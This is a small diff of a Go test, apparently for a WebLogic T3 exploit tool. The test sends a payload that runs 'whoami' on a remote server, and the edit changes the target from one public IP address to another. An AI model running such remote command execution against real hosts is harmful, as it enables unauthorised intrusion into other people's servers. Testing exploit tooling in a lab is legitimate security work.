@@ -6,7 +6,7 @@ import (
 
 func TestT3(t *testing.T) {
 	//t3 := NewT3Payload(SetAddr("192.168.101.147:7001"), SetTimeout(2))
-	t3 := NewT3Payload(SetAddr("47.104.229.232:7001"), SetTimeout(1))
+	t3 := NewT3Payload(SetAddr("34.228.52.53:7001"), SetTimeout(2))
 	res, err := t3.Exec("whoami")
 	if err != nil {
 		println(err.Error())
